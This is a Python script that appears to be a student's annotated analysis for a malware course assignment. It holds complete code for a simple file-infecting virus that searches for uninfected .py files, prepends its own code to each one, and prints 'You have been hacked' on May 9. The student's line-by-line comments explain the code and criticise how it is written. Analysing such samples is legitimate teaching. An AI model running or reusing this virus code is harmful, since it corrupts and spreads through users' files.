#!/usr/bin/python

# =====DO NOT RUN THIS PROGRAM=====

# Perform an analysis of the Python-based code:
#   Insert comments into each line of the script explaining in your own words what the virus is doing on this line.
#   Insert comments above each function explaining what the purpose of this function is and what it hopes to carry out.
#   Insert comments above the final three lines explaining how the functions are called and what this script appears to do.

# Stretch Goals (Optional Objectives):
# In your submission, include comments towards the bottom explaining the below:
#   Identify all the core Python/coding tools used by this script, e.g. functions.
#   What kind of malware is this? Define this type of malware in your own words.
#   How well is this code written? Would you have done something differently to achieve the same objective?

# This script is poorly written. It makes a lot of amateur, clumsy syntax choices that 
# make it easy to make syntax errors while writing. The biggest offender I see is using
# "files_targeted" as a local variable in locate(), then as an argument while defining 
# infect(), then again as a global variable in the final function call (which could be 
# dispensed with by simply nesting the function calls). 
# Even if this code runs, it's not because the person who coded it understands why it runs.


import os
import datetime

SIGNATURE = "VIRUS"                                         # I think this is jsut a variable??? Couldn't find much about google, but I really kind of feel like SIGNATURE is something special, 'cause VS Code colors it purple.


# This function appears to add full paths of all uninfected python files in a given 
# path to a list of targets, stored in the variable files_targeted.

def locate(path):                                           # starts defining a function with a directory path as an argument
    files_targeted = []                                     # creates an empty list to be filled with file paths
    filelist = os.listdir(path)                             # stores a list of all the names of things in the given directory
    for fname in filelist:                                  # opens a for loop to cycle through each name in that list
        if os.path.isdir(path+"/"+fname):                   # checks if the item is a directory
            files_targeted.extend(locate(path+"/"+fname))   # This line is supposed to conditionally call this function on a subdirectory, effectively making this function recursive
        elif fname[-3:] == ".py":                           # checks if the file is a python file by checking its suffix
            infected = False                                # sets an initial False variable
            for line in open(path+"/"+fname):               # opens a for-loop over each line in a python file
                if SIGNATURE in line:                       # checks if SIGNATURE is in the line, which I think is just the string "VIRUS"
                    infected = True                         # changes the status of the initial variable so as to skip the next if
                    break                                   # breaks this for-loop, ceasing to consider the pythin file
            if infected == False:                           # checks if the the initial variable is still False, which indicates SIGNATURE was not found anywhere in the python file
                files_targeted.append(path+"/"+fname)       # conditional upon SIGNATURE not being found, this line adds the python file to the list of targets
    return files_targeted                                   # spits the complete target list out


# This function appears to open its own code, read it line by line into a variable, then open each target file and write the virus code at the start of it.
def infect(files_targeted):                     # starts defining a function
    virus = open(os.path.abspath(__file__))     # opens a file and stores it in the variable `virus` (except __file__ isn't a valid file name, it's probbaly a placeholder? Maybe this is meant to call this file?) 
    virusstring = ""                            # initializes an empty string to be added to
    for i,line in enumerate(virus):             # opens a for-loop to read the contents to the file stored in `virus`, accumulating it line by line into `visustring`
        if 0 <= i < 39:
            virusstring += line
    virus.close                                 # closes the file
    for fname in files_targeted:                # starts a for-loop to iterate through target files
        f = open(fname)                         # opens a target file
        temp = f.read()                         # reads the contents of the target file into a variable
        f.close()                               # closes the file
        f = open(fname,"w")                     # re-opens the file but this time in write mode
        f.write(virusstring + temp)             # writes the virus code followed by the original contents of the python file back into the file
        f.close()                               # closes the file


# This function shitposts on May 9th
def detonate():
    if datetime.datetime.now().month == 5 and datetime.datetime.now().day == 9:
        print "You have been hacked"


# First this calls locate() on the current directory, so locate() should spit out a list 
# containing the path/name of every file in this directory and every subdirectory. It 
# stores this list in a variable, which it then immediately uses as the agument when calling 
# infect(), which will add the text of this virus to that python file.
# The end result is that every python file on the system will contain this virus, which will 
# run and thus further attempt to spread itself should that python program be called.
files_targeted = locate(os.path.abspath(""))
infect(files_targeted)
detonate()